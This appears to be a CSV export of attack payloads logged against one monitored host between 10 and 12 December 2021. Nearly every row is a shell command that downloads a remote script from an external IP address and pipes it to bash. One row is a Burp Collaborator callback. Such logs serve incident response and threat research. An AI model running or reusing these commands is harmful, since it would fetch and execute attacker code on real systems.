host,earliest,payload
dch1734pl5splnk,12/10/2021 21:04:51,(curl -s http://62.210.130.250/lh.sh||wget -q -O- http://62.210.130.250/lh.sh)|bash
dch1734pl5splnk,12/10/2021 21:13:16,curl wcb.ny.gov.nb2987zdx1uyes31bfyxu29y2p8iw7.burpcollaborator.net
dch1734pl5splnk,12/10/2021 21:14:29,wget -q -O- http://62.210.130.250/lh.sh|bash
dch1734pl5splnk,12/11/2021 10:33:20,wget https://fscrypt.net/ldap/get.php
dch1734pl5splnk,12/11/2021 23:55:04,(curl -s 45.155.205.233:5874/161.11.143.6:80||wget -q -O- 45.155.205.233:5874/161.11.143.6:80)|bash
dch1734pl5splnk,12/11/2021 23:55:14,(curl -s 45.155.205.233:5874/161.11.143.10:80||wget -q -O- 45.155.205.233:5874/161.11.143.10:80)|bash
dch1734pl5splnk,12/11/2021 23:55:17,(curl -s 45.155.205.233:5874/134.179.112.155:80||wget -q -O- 45.155.205.233:5874/134.179.112.155:80)|bash
dch1734pl5splnk,12/12/2021 00:09:04,(curl -s 45.155.205.233:5874/12.152.252.179:80||wget -q -O- 45.155.205.233:5874/12.152.252.179:80)|bash
dch1734pl5splnk,12/12/2021 00:12:56,(curl -s 45.155.205.233:5874/161.11.143.3:80||wget -q -O- 45.155.205.233:5874/161.11.143.3:80)|bash
dch1734pl5splnk,12/12/2021 00:24:03,(curl -s 45.155.205.233:5874/161.11.225.179:443||wget -q -O- 45.155.205.233:5874/161.11.225.179:443)|bash
dch1734pl5splnk,12/12/2021 00:24:03,(curl -s 45.155.205.233:5874/198.190.230.73:443||wget -q -O- 45.155.205.233:5874/198.190.230.73:443)|bash
dch1734pl5splnk,12/12/2021 00:24:08,(curl -s 45.155.205.233:5874/161.11.225.92:443||wget -q -O- 45.155.205.233:5874/161.11.225.92:443)|bash
dch1734pl5splnk,12/12/2021 00:33:02,(curl -s 45.155.205.233:5874/161.11.143.9:443||wget -q -O- 45.155.205.233:5874/161.11.143.9:443)|bash
